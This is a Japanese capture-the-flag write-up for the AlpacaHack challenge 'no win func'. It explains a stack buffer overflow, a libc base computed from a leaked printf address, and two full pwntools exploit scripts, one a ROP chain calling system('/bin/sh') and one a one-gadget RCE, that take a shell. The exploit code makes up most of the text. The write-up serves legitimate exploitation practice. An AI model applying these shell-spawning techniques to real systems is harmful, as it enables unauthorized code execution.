---
title: Daily AlpacaHack - no win func
layout: default
parent: Writeups
nav_order: 2
---

## 問題
![Pasted image 20260907115746](/assets/img/writeups/Daily-AlpacaHack-no-win-func/Pasted-image-20260907115746.png)

## 解法
### 要約
flag.txtはバイナリと同じディレクトリに格納されており、シェルを奪取することで中身が確認できる。
ターゲットのバイナリはSSPが付いておらず、buffer overflowを用いて直接リターンアドレスの書き換えが可能。
問題文にあるようにwin関数は存在しないため、gadgetを使う必要がある。
gadgetのアドレスを特定するために、printfのアドレスのリークを使用する。
ROPとone-gadget RCEの両方でシェルは奪取可能。（他にもあるのかも。）

> [!warning]
> libcからgadgetのアドレスを引っ張ってくる際、バージョンの差に注意。
> Dockerからライブラリを引っ張ってくること。
> ```
> docker create --name tmp ubuntu:24.04@sha256:c35e29c9450151419d9448b0fd75374fec4fff364a27f176fb458d472dfc9e54
docker cp tmp:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
docker cp tmp:/lib64/ld-linux-x86-64.so.2 ./ld.so
docker rm tmp
> ``` 

## スクリプト
### ROPバージョン
```python
#!/usr/bin/env python3

from pwn import *

printf_offset = 0x60100
system_offset = 0x58750
binsh_offset = 0x1CB42F
gadget_offset = 0x1157BC
ret_offset = 0x13B993
# one_gadget_offset = 0xEF52B
# writable_offset = 0x7FFFF7E032E0 - 0x7FFFF7C00000


def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc_base + ret_offset)
    payload += p64(libc_base + gadget_offset)
    payload += p64(libc_base + binsh_offset)
    payload += p64(libc_base + system_offset)

    r.sendlineafter(b"input > ", payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

### One-gadget RCEバージョン
```python
#!/usr/bin/env python3

from pwn import *

printf_offset = 0x60100
# system_offset = 0x58750
# binsh_offset = 0x1CB42F
# gadget_offset = 0x1157BC
# ret_offset = 0x13B993
one_gadget_offset = 0xEF52B
writable_offset = 0x7FFFF7E032E0 - 0x7FFFF7C00000


def main():
    r = conn()

    r.recvuntil(b"address of printf function: ")
    leak = int(r.recvline().strip(), 16)

    libc_base = leak - printf_offset

    payload = p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(libc_base + writable_offset)
    payload += p64(libc_base + one_gadget_offset)

    r.sendlineafter(b"input > ", payload)
    r.interactive()


if __name__ == "__main__":
    main()

```